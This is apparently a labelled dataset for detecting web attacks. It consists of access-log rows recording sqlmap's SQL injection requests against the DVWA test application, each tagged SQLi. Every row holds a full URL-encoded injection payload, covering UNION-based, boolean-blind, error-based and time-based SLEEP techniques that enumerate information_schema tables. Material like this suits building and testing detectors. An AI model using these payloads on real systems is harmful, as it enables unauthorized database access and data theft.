ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CINSUFFICIENT_PRIVILEGES%2CMISSING_BYTES_BEYOND_MAX_MEM_SIZE%2CTRACE%2C%60QUERY%60%29%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit HTTP/1.1,200,1847,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CINSUFFICIENT_PRIVILEGES%2CMISSING_BYTES_BEYOND_MAX_MEM_SIZE%2CTRACE%2C%60QUERY%60%29%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit,HTTP/1.1,317,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28INSUFFICIENT_PRIVILEGES%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MISSING_BYTES_BEYOND_MAX_MEM_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TRACE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60QUERY%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28INSUFFICIENT_PRIVILEGES%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MISSING_BYTES_BEYOND_MAX_MEM_SIZE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TRACE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60QUERY%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit,HTTP/1.1,481,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CINSUFFICIENT_PRIVILEGES%2CMISSING_BYTES_BEYOND_MAX_MEM_SIZE%2CTRACE%2C%60QUERY%60%29%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit HTTP/1.1,200,1847,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CINSUFFICIENT_PRIVILEGES%2CMISSING_BYTES_BEYOND_MAX_MEM_SIZE%2CTRACE%2C%60QUERY%60%29%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit,HTTP/1.1,317,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit HTTP/1.1,200,1793,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.OPTIMIZER_TRACE%23&Submit=Submit,HTTP/1.1,240,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,1817,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,225,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E48%23&Submit=Submit HTTP/1.1,200,1817,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E48%23&Submit=Submit,HTTP/1.1,225,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E9%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E9%23&Submit=Submit,HTTP/1.1,224,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E47%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C1%2C1%29%29%3E47%23&Submit=Submit,HTTP/1.1,225,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,1817,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,225,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E48%23&Submit=Submit HTTP/1.1,200,1817,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E48%23&Submit=Submit,HTTP/1.1,225,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E9%23&Submit=Submit HTTP/1.1,200,1816,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.OPTIMIZER_TRACE%29%2C2%2C1%29%29%3E9%23&Submit=Submit,HTTP/1.1,224,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f46545f434f4e464947%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1912,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f46545f434f4e464947%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,373,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2C%60KEY%60%2C%60VALUE%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2C%60KEY%60%2C%60VALUE%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit,HTTP/1.1,285,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28%60KEY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VALUE%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28%60KEY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VALUE%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit,HTTP/1.1,333,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28%60KEY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VALUE%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28%60KEY%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60VALUE%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%23&Submit=Submit,HTTP/1.1,308,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2C%60KEY%60%2C%60VALUE%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2C%60KEY%60%2C%60VALUE%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%20ORDER%20BY%20%60KEY%60%23&Submit=Submit,HTTP/1.1,285,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_FT_CONFIG%23&Submit=Submit,HTTP/1.1,241,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202638%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20EXBL&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202638%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20EXBL&Submit=Submit,HTTP/1.1,379,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,226,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E54%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E54%23&Submit=Submit,HTTP/1.1,226,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,226,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,226,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit,HTTP/1.1,313,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit,HTTP/1.1,313,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207011%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_CONFIG%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29HNwM%29--%20mVBj&Submit=Submit,HTTP/1.1,312,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x5448524541445f504f4f4c5f5741495453%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1924,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x5448524541445f504f4f4c5f5741495453%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,375,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CREASON%2C%60COUNT%60%29%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit HTTP/1.1,200,1794,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CREASON%2C%60COUNT%60%29%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit,HTTP/1.1,258,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28REASON%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60COUNT%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28REASON%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60COUNT%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit,HTTP/1.1,306,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CREASON%2C%60COUNT%60%29%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit HTTP/1.1,200,1794,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CREASON%2C%60COUNT%60%29%29%2C0x716a707171%29%20FROM%20information_schema.THREAD_POOL_WAITS%23&Submit=Submit,HTTP/1.1,258,5,40,SQLi
